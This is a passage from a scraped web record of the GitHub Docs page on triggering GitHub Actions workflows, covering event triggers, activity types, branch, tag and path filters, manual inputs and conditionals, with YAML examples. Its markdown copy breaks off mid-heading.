      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "BA86:988DE:1D9804:286117:681BF9F9",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "22597",
      "date": "Thu, 08 May 2025 06:42:07 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-ewr-kewr1740039-EWR",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686527.016860, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "36838",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Triggering a workflow - GitHub Docs\nHow to automatically trigger GitHub Actions workflows\nAbout workflow triggers\nWorkflow triggers are events that cause a workflow to run. These events can be:\nEvents that occur in your workflow's repository\nEvents that occur outside of GitHub and trigger a repository_dispatch event on GitHub\nScheduled times\nManual\nFor example, you can configure your workflow to run when a push is made to the default branch of your repository, when a release is created, or when an issue is opened.\nWorkflow triggers are defined with the on key. For more information, see Workflow syntax for GitHub Actions.\nThe following steps occur to trigger a workflow run:\nAn event occurs on your repository. The event has an associated commit SHA and Git ref.\nGitHub searches the .github/workflows directory in the root of your repository for workflow files that are present in the associated commit SHA or Git ref of the event.\nA workflow run is triggered for any workflows that have on: values that match the triggering event. Some events also require the workflow file to be present on the default branch of the repository in order to run.\nEach workflow run will use the version of the workflow that is present in the associated commit SHA or Git ref of the event. When a workflow runs, GitHub sets the GITHUB_SHA (commit SHA) and GITHUB_REF (Git ref) environment variables in the runner environment. For more information, see Store information in variables.\nTriggering a workflow from a workflow\nWhen you use the repository's GITHUB_TOKEN to perform tasks, events triggered by the GITHUB_TOKEN, with the exception of workflow_dispatch and repository_dispatch, will not create a new workflow run. This prevents you from accidentally creating recursive workflow runs. For example, if a workflow run pushes code using the repository's GITHUB_TOKEN, a new workflow will not run even when the repository contains a workflow configured to run when push events occur. For more information, see Automatic token authentication.\nIf you do want to trigger a workflow from within a workflow run, you can use a GitHub App installation access token or a personal access token instead of GITHUB_TOKEN to trigger events that require a token.\nIf you use a GitHub App, you'll need to create a GitHub App and store the app ID and private key as secrets. For more information, see Making authenticated API requests with a GitHub App in a GitHub Actions workflow. If you use a personal access token, you'll need to create a personal access token and store it as a secret. For more information about creating a personal access token, see Managing your personal access tokens. For more information about storing secrets, see Using secrets in GitHub Actions.\nTo minimize your GitHub Actions usage costs, ensure that you don't create recursive or unintended workflow runs.\nFor example, the following workflow uses a personal access token (stored as a secret called MY_TOKEN) to add a label to an issue via GitHub CLI. Any workflows that run when a label is added will run once this step is performed.\non: issues: types: - opened jobs: label_issue: runs-on: ubuntu-latest steps: - env: GH_TOKEN: ${{ secrets.MY_TOKEN }} ISSUE_URL: ${{ github.event.issue.html_url }} run: | gh issue edit $ISSUE_URL --add-label \"triage\" \nConversely, the following workflow uses GITHUB_TOKEN to add a label to an issue. It will not trigger any workflows that run when a label is added.\non: issues: types: - opened jobs: label_issue: runs-on: ubuntu-latest steps: - env: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} ISSUE_URL: ${{ github.event.issue.html_url }} run: | gh issue edit $ISSUE_URL --add-label \"triage\" \nUsing events to trigger workflows\nUse the on key to specify what events trigger your workflow. For more information about events you can use, see Events that trigger workflows.\nUsing a single event\nFor example, a workflow with the following on value will run when a push is made to any branch in the workflow's repository:\non: push \nUsing multiple events\nYou can specify a single event or multiple events. For example, a workflow with the following on value will run when a push is made to any branch in the repository or when someone forks the repository:\non: [push, fork] \nIf you specify multiple events, only one of those events needs to occur to trigger your workflow. If multiple triggering events for your workflow occur at the same time, multiple workflow runs will be triggered.\nUsing activity types and filters with multiple events\nYou can use activity types and filters to further control when your workflow will run. For more information, see Using event activity types and Using filters. If you specify activity types or filters for an event and your workflow triggers on multiple events, you must configure each event separately. You must append a colon (:) to all events, including events without configuration.\nFor example, a workflow with the following on value will run when:\nA label is created\nA push is made to the main branch in the repository\nA push is made to a GitHub Pages-enabled branch\non: label: types: - created push: branches: - main page_build: \nUsing event activity types\nSome events have activity types that give you more control over when your workflow should run. Use on.<event_name>.types to define the type of event activity that will trigger a workflow run.\nFor example, the issue_comment event has the created, edited, and deleted activity types. If your workflow triggers on the label event, it will run whenever a label is created, edited, or deleted. If you specify the created activity type for the label event, your workflow will run when a label is created but not when a label is edited or deleted.\non: label: types: - created \nIf you specify multiple activity types, only one of those event activity types needs to occur to trigger your workflow. If multiple triggering event activity types for your workflow occur at the same time, multiple workflow runs will be triggered. For example, the following workflow triggers when an issue is opened or labeled. If an issue with two labels is opened, three workflow runs will start: one for the issue opened event and two for the two issue labeled events.\non: issues: types: - opened - labeled \nFor more information about each event and their activity types, see Events that trigger workflows.\nUsing filters\nSome events have filters that give you more control over when your workflow should run.\nFor example, the push event has a branches filter that causes your workflow to run only when a push to a branch that matches the branches filter occurs, instead of when any push occurs.\non: push: branches: - main - 'releases/**' \nUsing filters to target specific branches for pull request events\nWhen using the pull_request and pull_request_target events, you can configure a workflow to run only for pull requests that target specific branches.\nUse the branches filter when you want to include branch name patterns or when you want to both include and exclude branch names patterns. Use the branches-ignore filter when you only want to exclude branch name patterns. You cannot use both the branches and branches-ignore filters for the same event in a workflow.\nIf you define both branches/branches-ignore and paths/paths-ignore, the workflow will only run when both filters are satisfied.\nThe branches and branches-ignore keywords accept glob patterns that use characters like *, **, +, ?, ! and others to match more than one branch name. If a name contains any of these characters and you want a literal match, you need to escape each of these special characters with \\. For more information about glob patterns, see the Workflow syntax for GitHub Actions.\nExample: Including branches\nThe patterns defined in branches are evaluated against the Git ref's name. For example, the following workflow would run whenever there is a pull_request event for a pull request targeting:\nA branch named main (refs/heads/main)\nA branch named mona/octocat (refs/heads/mona/octocat)\nA branch whose name starts with releases/, like releases/10 (refs/heads/releases/10)\non: pull_request: # Sequence of patterns matched against refs/heads branches: - main - 'mona/octocat' - 'releases/**' \nIf a workflow is skipped due to branch filtering, path filtering, or a commit message, then checks associated with that workflow will remain in a \"Pending\" state. A pull request that requires those checks to be successful will be blocked from merging.\nExample: Excluding branches\nWhen a pattern matches the branches-ignore pattern, the workflow will not run. The patterns defined in branches-ignore are evaluated against the Git ref's name. For example, the following workflow would run whenever there is a pull_request event unless the pull request is targeting:\nA branch named mona/octocat (refs/heads/mona/octocat)\nA branch whose name matches releases/**-alpha, like releases/beta/3-alpha (refs/heads/releases/beta/3-alpha)\non: pull_request: # Sequence of patterns matched against refs/heads branches-ignore: - 'mona/octocat' - 'releases/**-alpha' \nExample: Including and excluding branches\nYou cannot use branches and branches-ignore to filter the same event in a single workflow. If you want to both include and exclude branch patterns for a single event, use the branches filter along with the ! character to indicate which branches should be excluded.\nIf you define a branch with the ! character, you must also define at least one branch without the ! character. If you only want to exclude branches, use branches-ignore instead.\nThe order that you define patterns matters.\nA matching negative pattern (prefixed with !) after a positive match will exclude the Git ref.\nA matching positive pattern after a negative match will include the Git ref again.\nThe following workflow will run on pull_request events for pull requests that target releases/10 or releases/beta/mona, but not for pull requests that target releases/10-alpha or releases/beta/3-alpha because the negative pattern !releases/**-alpha follows the positive pattern.\non: pull_request: branches: - 'releases/**' - '!releases/**-alpha' \nUsing filters to target specific branches or tags for push events\nWhen using the push event, you can configure a workflow to run on specific branches or tags.\nUse the branches filter when you want to include branch name patterns or when you want to both include and exclude branch names patterns. Use the branches-ignore filter when you only want to exclude branch name patterns. You cannot use both the branches and branches-ignore filters for the same event in a workflow.\nUse the tags filter when you want to include tag name patterns or when you want to both include and exclude tag names patterns. Use the tags-ignore filter when you only want to exclude tag name patterns. You cannot use both the tags and tags-ignore filters for the same event in a workflow.\nIf you define only tags/tags-ignore or only branches/branches-ignore, the workflow won't run for events affecting the undefined Git ref. If you define neither tags/tags-ignore or branches/branches-ignore, the workflow will run for events affecting either branches or tags. If you define both branches/branches-ignore and paths/paths-ignore, the workflow will only run when both filters are satisfied.\nThe branches, branches-ignore, tags, and tags-ignore keywords accept glob patterns that use characters like *, **, +, ?, ! and others to match more than one branch or tag name. If a name contains any of these characters and you want a literal match, you need to escape each of these special characters with \\. For more information about glob patterns, see the Workflow syntax for GitHub Actions.\nExample: Including branches and tags\nThe patterns defined in branches and tags are evaluated against the Git ref's name. For example, the following workflow would run whenever there is a push event to:\nA branch named main (refs/heads/main)\nA branch named mona/octocat (refs/heads/mona/octocat)\nA branch whose name starts with releases/, like releases/10 (refs/heads/releases/10)\nA tag named v2 (refs/tags/v2)\nA tag whose name starts with v1., like v1.9.1 (refs/tags/v1.9.1)\non: push: # Sequence of patterns matched against refs/heads branches: - main - 'mona/octocat' - 'releases/**' # Sequence of patterns matched against refs/tags tags: - v2 - v1.* \nExample: Excluding branches and tags\nWhen a pattern matches the branches-ignore or tags-ignore pattern, the workflow will not run. The patterns defined in branches and tags are evaluated against the Git ref's name. For example, the following workflow would run whenever there is a push event, unless the push event is to:\nA branch named mona/octocat (refs/heads/mona/octocat)\nA branch whose name matches releases/**-alpha, like releases/beta/3-alpha (refs/heads/releases/beta/3-alpha)\nA tag named v2 (refs/tags/v2)\nA tag whose name starts with v1., like v1.9 (refs/tags/v1.9)\non: push: # Sequence of patterns matched against refs/heads branches-ignore: - 'mona/octocat' - 'releases/**-alpha' # Sequence of patterns matched against refs/tags tags-ignore: - v2 - v1.* \nExample: Including and excluding branches and tags\nYou can't use branches and branches-ignore to filter the same event in a single workflow. Similarly, you can't use tags and tags-ignore to filter the same event in a single workflow. If you want to both include and exclude branch or tag patterns for a single event, use the branches or tags filter along with the ! character to indicate which branches or tags should be excluded.\nIf you define a branch with the ! character, you must also define at least one branch without the ! character. If you only want to exclude branches, use branches-ignore instead. Similarly, if you define a tag with the ! character, you must also define at least one tag without the ! character. If you only want to exclude tags, use tags-ignore instead.\nThe order that you define patterns matters.\nA matching negative pattern (prefixed with !) after a positive match will exclude the Git ref.\nA matching positive pattern after a negative match will include the Git ref again.\nThe following workflow will run on pushes to releases/10 or releases/beta/mona, but not on releases/10-alpha or releases/beta/3-alpha because the negative pattern !releases/**-alpha follows the positive pattern.\non: push: branches: - 'releases/**' - '!releases/**-alpha' \nUsing filters to target specific paths for pull request or push events\nWhen using the push and pull_request events, you can configure a workflow to run based on what file paths are changed. Path filters are not evaluated for pushes of tags.\nUse the paths filter when you want to include file path patterns or when you want to both include and exclude file path patterns. Use the paths-ignore filter when you only want to exclude file path patterns. You cannot use both the paths and paths-ignore filters for the same event in a workflow. If you want to both include and exclude path patterns for a single event, use the paths filter prefixed with the ! character to indicate which paths should be excluded.\nNote\nThe order that you define paths patterns matters:\nA matching negative pattern (prefixed with !) after a positive match will exclude the path.\nA matching positive pattern after a negative match will include the path again.\nIf you define both branches/branches-ignore and paths/paths-ignore, the workflow will only run when both filters are satisfied.\nThe paths and paths-ignore keywords accept glob patterns that use the * and ** wildcard characters to match more than one path name. For more information, see the Workflow syntax for GitHub Actions.\nExample: Including paths\nIf at least one path matches a pattern in the paths filter, the workflow runs. For example, the following workflow would run anytime you push a JavaScript file (.js).\non: push: paths: - '**.js' \nIf a workflow is skipped due to path filtering, branch filtering, or a commit message, then checks associated with that workflow will remain in a \"Pending\" state. A pull request that requires those checks to be successful will be blocked from merging.\nExample: Excluding paths\nWhen all the path names match patterns in paths-ignore, the workflow will not run. If any path names do not match patterns in paths-ignore, even if some path names match the patterns, the workflow will run.\nA workflow with the following path filter will only run on push events that include at least one file outside the docs directory at the root of the repository.\non: push: paths-ignore: - 'docs/**' \nExample: Including and excluding paths\nYou cannot use paths and paths-ignore to filter the same event in a single workflow. If you want to both include and exclude path patterns for a single event, use the paths filter prefixed with the ! character to indicate which paths should be excluded.\nIf you define a path with the ! character, you must also define at least one path without the ! character. If you only want to exclude paths, use paths-ignore instead.\nThe order that you define paths patterns matters:\nA matching negative pattern (prefixed with !) after a positive match will exclude the path.\nA matching positive pattern after a negative match will include the path again.\nThis example runs anytime the push event includes a file in the sub-project directory or its subdirectories, unless the file is in the sub-project/docs directory. For example, a push that changed sub-project/index.js or sub-project/src/index.js will trigger a workflow run, but a push changing only sub-project/docs/readme.md will not.\non: push: paths: - 'sub-project/**' - '!sub-project/docs/**' \nGit diff comparisons\nNote\nIf you push more than 1,000 commits, or if GitHub does not generate the diff due to a timeout, the workflow will always run.\nThe filter determines if a workflow should run by evaluating the changed files and running them against the paths-ignore or paths list. If there are no files changed, the workflow will not run.\nGitHub generates the list of changed files using two-dot diffs for pushes and three-dot diffs for pull requests:\nPull requests: Three-dot diffs are a comparison between the most recent version of the topic branch and the commit where the topic branch was last synced with the base branch.\nPushes to existing branches: A two-dot diff compares the head and base SHAs directly with each other.\nPushes to new branches: A two-dot diff against the parent of the ancestor of the deepest commit pushed.\nDiffs are limited to 300 files. If there are files changed that aren't matched in the first 300 files returned by the filter, the workflow will not run. You may need to create more specific filters so that the workflow will run automatically.\nFor more information, see About comparing branches in pull requests.\nUsing filters to target specific branches for workflow run events\nWhen using the workflow_run event, you can specify what branches the triggering workflow must run on in order to trigger your workflow.\nThe branches and branches-ignore filters accept glob patterns that use characters like *, **, +, ?, ! and others to match more than one branch name. If a name contains any of these characters and you want a literal match, you need to escape each of these special characters with \\. For more information about glob patterns, see the Workflow syntax for GitHub Actions.\nFor example, a workflow with the following trigger will only run when the workflow named Build runs on a branch whose name starts with releases/:\non: workflow_run: workflows: [\"Build\"] types: [requested] branches: - 'releases/**' \nA workflow with the following trigger will only run when the workflow named Build runs on a branch that is not named canary:\non: workflow_run: workflows: [\"Build\"] types: [requested] branches-ignore: - \"canary\" \nYou cannot use both the branches and branches-ignore filters for the same event in a workflow. If you want to both include and exclude branch patterns for a single event, use the branches filter along with the ! character to indicate which branches should be excluded.\nThe order that you define patterns matters.\nA matching negative pattern (prefixed with !) after a positive match will exclude the branch.\nA matching positive pattern after a negative match will include the branch again.\nFor example, a workflow with the following trigger will run when the workflow named Build runs on a branch that is named releases/10 or releases/beta/mona but will not releases/10-alpha, releases/beta/3-alpha, or main.\non: workflow_run: workflows: [\"Build\"] types: [requested] branches: - 'releases/**' - '!releases/**-alpha' \nDefining inputs for manually triggered workflows\nWhen using the workflow_dispatch event, you can optionally specify inputs that are passed to the workflow.\nThis trigger only receives events when the workflow file is on the default branch. The triggered workflow receives the inputs in the inputs context. For more information, see Contexts.\nNote\nThe workflow will also receive the inputs in the github.event.inputs context. The information in the inputs context and github.event.inputs context is identical except that the inputs context preserves Boolean values as Booleans instead of converting them to strings. The choice type resolves to a string and is a single selectable option.\nThe maximum number of top-level properties for inputs is 10.\nThe maximum payload for inputs is 65,535 characters.\non: workflow_dispatch: inputs: logLevel: description: 'Log level' required: true default: 'warning' type: choice options: - info - warning - debug print_tags: description: 'True to print to STDOUT' required: true type: boolean tags: description: 'Test scenario tags' required: true type: string environment: description: 'Environment to run tests against' type: environment required: true jobs: print-tag: runs-on: ubuntu-latest if: ${{ inputs.print_tags }} steps: - name: Print the input tag to STDOUT run: echo The tags are ${{ inputs.tags }} \nDefining inputs, outputs, and secrets for reusable workflows\nYou can define inputs and secrets that a reusable workflow should receive from a calling workflow. You can also specify outputs that a reusable workflow will make available to a calling workflow. For more information, see Reusing workflows.\nUsing event information\nInformation about the event that triggered a workflow run is available in the github.event context. The properties in the github.event context depend on the type of event that triggered the workflow. For example, a workflow triggered when an issue is labeled would have information about the issue and label.\nViewing all properties of an event\nReference the webhook event documentation for common properties and example payloads. For more information, see Webhook events and payloads.\nYou can also print the entire github.event context to see what properties are available for the event that triggered your workflow:\njobs: print_context: runs-on: ubuntu-latest steps: - env: EVENT_CONTEXT: ${{ toJSON(github.event) }} run: | echo $EVENT_CONTEXT \nAccessing and using event properties\nYou can use the github.event context in your workflow. For example, the following workflow runs when a pull request that changes package*.json, .github/CODEOWNERS, or .github/workflows/** is opened. If the pull request author (github.event.pull_request.user.login) is not octobot or dependabot[bot], then the workflow uses the GitHub CLI to label and comment on the pull request (github.event.pull_request.number).\non: pull_request: types: - opened paths: - '.github/workflows/**' - '.github/CODEOWNERS' - 'package*.json' jobs: triage: if: >- github.event.pull_request.user.login != 'octobot' && github.event.pull_request.user.login != 'dependabot[bot]' runs-on: ubuntu-latest steps: - name: \"Comment about changes we can't accept\" env: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} PR: ${{ github.event.pull_request.html_url }} run: | gh pr edit $PR --add-label 'invalid' gh pr comment $PR --body 'It looks like you edited `package*.json`, `.github/CODEOWNERS`, or `.github/workflows/**`. We do not allow contributions to these files. Please review our [contributing guidelines](https://github.com/octo-org/octo-repo/blob/main/CONTRIBUTING.md) for what contributions are accepted.' \nFor more information about contexts, see Accessing contextual information about workflow runs. For more information about event payloads, see Webhook events and payloads.\nFurther controlling how your workflow will run\nIf you want more granular control than events, event activity types, or event filters provide, you can use conditionals and environments to control whether individual jobs or steps in your workflow will run.\nUsing conditionals\nYou can use conditionals to further control whether jobs or steps in your workflow will run.\nExample using a value in the event payload\nFor example, if you want the workflow to run when a specific label is added to an issue, you can trigger on the issues labeled event activity type and use a conditional to check what label triggered the workflow. The following workflow will run when any label is added to an issue in the workflow's repository, but the run_if_label_matches job will only execute if the label is named bug.\non: issues: types: - labeled jobs: run_if_label_matches: if: github.event.label.name == 'bug' runs-on: ubuntu-latest steps: - run: echo 'The label was bug' \nExample using event type\nFor example, if you want to run different jobs or steps depending on what event triggered the workflow, you can use a conditional to check whether a specific event type exists in the event context. The following workflow will run whenever an issue or pull request is closed. If the workflow ran because an issue was closed, the github.event context will contain a value for issue but not for pull_request. Therefore, the if_issue step will run but the if_pr step will not run. Conversely, if the workflow ran because a pull request was closed, the if_pr step will run but the if_issue step will not run.\non: issues: types: - closed pull_request: types: - closed jobs: state_event_type: runs-on: ubuntu-latest steps: - name: if_issue if: github.event.issue run: | echo An issue was closed - name: if_pr if: github.event.pull_request run: | echo A pull request was closed \nFor more information about what information is available in the event context, see Using event information. For more information about how to use conditionals, see Evaluate expressions in workflows and actions.\nUsing environments to manually trigger workflow jobs\nIf you want to manually trigger a specific job in a workflow, you can use an environment that requires approval from a specific team or user. First, configure an environment with required reviewers. For more information, see Managing environments for deployment. Then, reference the environment name in a job in your workflow using the environment: key. Any job referencing the environment will not run until at least one reviewer approves the job.\nFor example, the following workflow will run whenever there is a push to main. The build job will always run. The publish job will only run after the build job successfully completes (due to needs: [build]) and after all of the rules (including required reviewers) for the environment called production pass (due to environment: production).\non: push: branches: - main jobs: build: runs-on: ubuntu-latest steps: - name: build run: | echo 'building' publish: needs: [build] runs-on: ubuntu-latest environment: production steps: - name: publish run: | echo 'publishing' \nNote\nEnvironments, environment secrets, and deployment protection rules are available in public repositories for all current GitHub plans. They are not available on legacy plans, such as Bronze, Silver, or Gold. For access to environments, environment secrets, and deployment branches in private or internal repositories, you must use GitHub Pro, GitHub Team, or GitHub Enterprise. If you are on a GitHub Free, GitHub Pro, or GitHub Team plan, other deployment protection rules, such as a wait timer or required reviewers, are only available for public repositories.\nAvailable events\nFor a full list of available events, see Events that trigger workflows.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-triggering-a-workflow-8ee78.html",
  "markdown": "# Triggering a workflow - GitHub Docs\n\nHow to automatically trigger GitHub Actions workflows\n\n## [About workflow triggers](#about-workflow-triggers)\n\nWorkflow triggers are events that cause a workflow to run. These events can be:\n\n*   Events that occur in your workflow's repository\n*   Events that occur outside of GitHub and trigger a `repository_dispatch` event on GitHub\n*   Scheduled times\n*   Manual\n\nFor example, you can configure your workflow to run when a push is made to the default branch of your repository, when a release is created, or when an issue is opened.\n\nWorkflow triggers are defined with the `on` key. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#on).\n\nThe following steps occur to trigger a workflow run:\n\n1.  An event occurs on your repository. The event has an associated commit SHA and Git ref.\n    \n2.  GitHub searches the `.github/workflows` directory in the root of your repository for workflow files that are present in the associated commit SHA or Git ref of the event.\n    \n3.  A workflow run is triggered for any workflows that have `on:` values that match the triggering event. Some events also require the workflow file to be present on the default branch of the repository in order to run.\n    \n    Each workflow run will use the version of the workflow that is present in the associated commit SHA or Git ref of the event. When a workflow runs, GitHub sets the `GITHUB_SHA` (commit SHA) and `GITHUB_REF` (Git ref) environment variables in the runner environment. For more information, see [Store information in variables](https://docs.github.com/en/actions/learn-github-actions/variables).\n    \n\n### [Triggering a workflow from a workflow](#triggering-a-workflow-from-a-workflow)\n\nWhen you use the repository's `GITHUB_TOKEN` to perform tasks, events triggered by the `GITHUB_TOKEN`, with the exception of `workflow_dispatch` and `repository_dispatch`, will not create a new workflow run. This prevents you from accidentally creating recursive workflow runs. For example, if a workflow run pushes code using the repository's `GITHUB_TOKEN`, a new workflow will not run even when the repository contains a workflow configured to run when `push` events occur. For more information, see [Automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication).\n\nIf you do want to trigger a workflow from within a workflow run, you can use a GitHub App installation access token or a personal access token instead of `GITHUB_TOKEN` to trigger events that require a token.\n\nIf you use a GitHub App, you'll need to create a GitHub App and store the app ID and private key as secrets. For more information, see [Making authenticated API requests with a GitHub App in a GitHub Actions workflow](https://docs.github.com/en/apps/creating-github-apps/guides/making-authenticated-api-requests-with-a-github-app-in-a-github-actions-workflow). If you use a personal access token, you'll need to create a personal access token and store it as a secret. For more information about creating a personal access token, see [Managing your personal access tokens](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/creating-a-personal-access-token). For more information about storing secrets, see [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions).\n\nTo minimize your GitHub Actions usage costs, ensure that you don't create recursive or unintended workflow runs.\n\nFor example, the following workflow uses a personal access token (stored as a secret called `MY_TOKEN`) to add a label to an issue via GitHub CLI. Any workflows that run when a label is added will run once this step is performed.\n\n```\non:\n  issues:\n    types:\n      - opened\n\njobs:\n  label_issue:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          GH_TOKEN: ${{ secrets.MY_TOKEN }}\n          ISSUE_URL: ${{ github.event.issue.html_url }}\n        run: |\n          gh issue edit $ISSUE_URL --add-label \"triage\"\n```\n\nConversely, the following workflow uses `GITHUB_TOKEN` to add a label to an issue. It will not trigger any workflows that run when a label is added.\n\n```\non:\n  issues:\n    types:\n      - opened\n\njobs:\n  label_issue:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          ISSUE_URL: ${{ github.event.issue.html_url }}\n        run: |\n          gh issue edit $ISSUE_URL --add-label \"triage\"\n```\n\n## [Using events to trigger workflows](#using-events-to-trigger-workflows)\n\nUse the `on` key to specify what events trigger your workflow. For more information about events you can use, see [Events that trigger workflows](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows).\n\n### [Using a single event](#using-a-single-event)\n\nFor example, a workflow with the following `on` value will run when a push is made to any branch in the workflow's repository:\n\n```\non: push\n```\n\n### [Using multiple events](#using-multiple-events)\n\nYou can specify a single event or multiple events. For example, a workflow with the following `on` value will run when a push is made to any branch in the repository or when someone forks the repository:\n\n```\non: [push, fork]\n```\n\nIf you specify multiple events, only one of those events needs to occur to trigger your workflow. If multiple triggering events for your workflow occur at the same time, multiple workflow runs will be triggered.\n\n### [Using activity types and filters with multiple events](#using-activity-types-and-filters-with-multiple-events)\n\nYou can use activity types and filters to further control when your workflow will run. For more information, see [Using event activity types](#using-event-activity-types) and [Using filters](#using-filters). If you specify activity types or filters for an event and your workflow triggers on multiple events, you must configure each event separately. You must append a colon (`:`) to all events, including events without configuration.\n\nFor example, a workflow with the following `on` value will run when:\n\n*   A label is created\n*   A push is made to the `main` branch in the repository\n*   A push is made to a GitHub Pages-enabled branch\n\n```\non:\n  label:\n    types:\n      - created\n  push:\n    branches:\n      - main\n  page_build:\n```\n\n## [Using event activity types](#using-event-activity-types)\n\nSome events have activity types that give you more control over when your workflow should run. Use `on.<event_name>.types` to define the type of event activity that will trigger a workflow run.\n\nFor example, the `issue_comment` event has the `created`, `edited`, and `deleted` activity types. If your workflow triggers on the `label` event, it will run whenever a label is created, edited, or deleted. If you specify the `created` activity type for the `label` event, your workflow will run when a label is created but not when a label is edited or deleted.\n\n```\non:\n  label:\n    types:\n      - created\n```\n\nIf you specify multiple activity types, only one of those event activity types needs to occur to trigger your workflow. If multiple triggering event activity types for your workflow occur at the same time, multiple workflow runs will be triggered. For example, the following workflow triggers when an issue is opened or labeled. If an issue with two labels is opened, three workflow runs will start: one for the issue opened event and two for the two issue labeled events.\n\n```\non:\n  issues:\n    types:\n      - opened\n      - labeled\n```\n\nFor more information about each event and their activity types, see [Events that trigger workflows](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows).\n\n## [Using filters](#using-filters)\n\nSome events have filters that give you more control over when your workflow should run.\n\nFor example, the `push` event has a `branches` filter that causes your workflow to run only when a push to a branch that matches the `branches` filter occurs, instead of when any push occurs.\n\n```\non:\n  push:\n    branches:\n      - main\n      - 'releases/**'\n```\n\n### [Using filters to target specific branches for pull request events](#using-filters-to-target-specific-branches-for-pull-request-events)\n\nWhen using the `pull_request` and `pull_request_target` events, you can configure a workflow to run only for pull requests that target specific branches.\n\nUse the `branches` filter when you want to include branch name patterns or when you want to both include and exclude branch names patterns. Use the `branches-ignore` filter when you only want to exclude branch name patterns. You cannot use both the `branches` and `branches-ignore` filters for the same event in a workflow.\n\nIf you define both `branches`/`branches-ignore` and [`paths`/`paths-ignore`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore), the workflow will only run when both filters are satisfied.\n\nThe `branches` and `branches-ignore` keywords accept glob patterns that use characters like `*`, `**`, `+`, `?`, `!` and others to match more than one branch name. If a name contains any of these characters and you want a literal match, you need to escape each of these special characters with `\\`. For more information about glob patterns, see the [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#filter-pattern-cheat-sheet).\n\n#### [Example: Including branches](#example-including-branches)\n\nThe patterns defined in `branches` are evaluated against the Git ref's name. For example, the following workflow would run whenever there is a `pull_request` event for a pull request targeting:\n\n*   A branch named `main` (`refs/heads/main`)\n*   A branch named `mona/octocat` (`refs/heads/mona/octocat`)\n*   A branch whose name starts with `releases/`, like `releases/10` (`refs/heads/releases/10`)\n\n```\non:\n  pull_request:\n    # Sequence of patterns matched against refs/heads\n    branches:\n      - main\n      - 'mona/octocat'\n      - 'releases/**'\n```\n\nIf a workflow is skipped due to branch filtering, [path filtering](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore), or a [commit message](https://docs.github.com/en/actions/managing-workflow-runs/skipping-workflow-runs), then checks associated with that workflow will remain in a \"Pending\" state. A pull request that requires those checks to be successful will be blocked from merging.\n\n#### [Example: Excluding branches](#example-excluding-branches)\n\nWhen a pattern matches the `branches-ignore` pattern, the workflow will not run. The patterns defined in `branches-ignore` are evaluated against the Git ref's name. For example, the following workflow would run whenever there is a `pull_request` event unless the pull request is targeting:\n\n*   A branch named `mona/octocat` (`refs/heads/mona/octocat`)\n*   A branch whose name matches `releases/**-alpha`, like `releases/beta/3-alpha` (`refs/heads/releases/beta/3-alpha`)\n\n```\non:\n  pull_request:\n    # Sequence of patterns matched against refs/heads\n    branches-ignore:\n      - 'mona/octocat'\n      - 'releases/**-alpha'\n```\n\n#### [Example: Including and excluding branches](#example-including-and-excluding-branches)\n\nYou cannot use `branches` and `branches-ignore` to filter the same event in a single workflow. If you want to both include and exclude branch patterns for a single event, use the `branches` filter along with the `!` character to indicate which branches should be excluded.\n\nIf you define a branch with the `!` character, you must also define at least one branch without the `!` character. If you only want to exclude branches, use `branches-ignore` instead.\n\nThe order that you define patterns matters.\n\n*   A matching negative pattern (prefixed with `!`) after a positive match will exclude the Git ref.\n*   A matching positive pattern after a negative match will include the Git ref again.\n\nThe following workflow will run on `pull_request` events for pull requests that target `releases/10` or `releases/beta/mona`, but not for pull requests that target `releases/10-alpha` or `releases/beta/3-alpha` because the negative pattern `!releases/**-alpha` follows the positive pattern.\n\n```\non:\n  pull_request:\n    branches:\n      - 'releases/**'\n      - '!releases/**-alpha'\n```\n\n### [Using filters to target specific branches or tags for push events](#using-filters-to-target-specific-branches-or-tags-for-push-events)\n\nWhen using the `push` event, you can configure a workflow to run on specific branches or tags.\n\nUse the `branches` filter when you want to include branch name patterns or when you want to both include and exclude branch names patterns. Use the `branches-ignore` filter when you only want to exclude branch name patterns. You cannot use both the `branches` and `branches-ignore` filters for the same event in a workflow.\n\nUse the `tags` filter when you want to include tag name patterns or when you want to both include and exclude tag names patterns. Use the `tags-ignore` filter when you only want to exclude tag name patterns. You cannot use both the `tags` and `tags-ignore` filters for the same event in a workflow.\n\nIf you define only `tags`/`tags-ignore` or only `branches`/`branches-ignore`, the workflow won't run for events affecting the undefined Git ref. If you define neither `tags`/`tags-ignore` or `branches`/`branches-ignore`, the workflow will run for events affecting either branches or tags. If you define both `branches`/`branches-ignore` and [`paths`/`paths-ignore`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore), the workflow will only run when both filters are satisfied.\n\nThe `branches`, `branches-ignore`, `tags`, and `tags-ignore` keywords accept glob patterns that use characters like `*`, `**`, `+`, `?`, `!` and others to match more than one branch or tag name. If a name contains any of these characters and you want a literal match, you need to _escape_ each of these special characters with `\\`. For more information about glob patterns, see the [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#filter-pattern-cheat-sheet).\n\n#### [Example: Including branches and 